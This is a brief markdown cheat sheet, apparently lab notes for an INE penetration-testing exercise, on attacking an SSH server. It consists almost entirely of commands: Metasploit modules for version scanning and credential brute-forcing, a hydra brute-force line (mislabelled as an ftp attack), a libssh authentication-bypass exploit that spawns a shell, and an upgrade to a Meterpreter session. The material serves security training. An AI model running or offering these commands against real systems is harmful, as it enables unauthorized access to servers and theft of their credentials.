# Exploiting SSH

- __To find the version of the ssh server__

__Commands:__
```
msfconsole
use auxiliary/scanner/ssh/ssh_version
set RHOSTS demo.ine.local
exploit
```

__Brup force attack on ftp__
- __`hydra -L/usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.198.30.3 -t 4 ssh`__


- __We will now use ssh_login module to find the valid credentials to access the ssh server.__

__Commands:__
```
use auxiliary/scanner/ssh/ssh_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
set STOP_ON_SUCCESS true
set VERBOSE true
exploit
```



# other method 
- __`search libssh_auth_bypass`__
```
use auxiliary/scanner/ssh/libssh_auth_bypass
set SPAWN_PTY true
exploit
```
__upgrading to meterpreter shell__
```
use post/multi/manage/shell_to_meterpreter
set LHOST eth1
set session 1
```

